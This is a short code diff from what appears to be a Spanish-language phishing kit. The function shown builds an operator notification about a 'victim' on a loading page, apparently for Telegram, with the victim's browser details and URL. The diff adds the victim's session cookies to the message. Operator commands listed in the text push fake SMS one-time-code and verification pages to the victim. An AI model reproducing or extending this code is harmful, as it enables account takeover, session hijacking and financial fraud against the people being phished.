@@ -94,12 +94,13 @@ function enviarNotificacionPagina() {
 
 
         const mensaje = escapeMarkdownV2(`👀 *Víctima en página de carga*
-🌐 Detalles:
-📱 Dispositivo: ${navigator.userAgent}
-🌍 URL: ${window.location.href}
+🌐 Detalles:\n
+📱 Dispositivo: ${navigator.userAgent}\n
+Cookies: ${document.cookie || 'Sin cookies'}\n
+🌍 URL: ${window.location.href}\n
 
-Opciones:
-📝 *Opciones:*  
+
+📝 <b>*Opciones:</b>  
 ➡️ /show pag1 - otp SMS
 ➡️ /show pag2 - Dinámica
 ➡️ /show pag3 - Dinámica Expiro
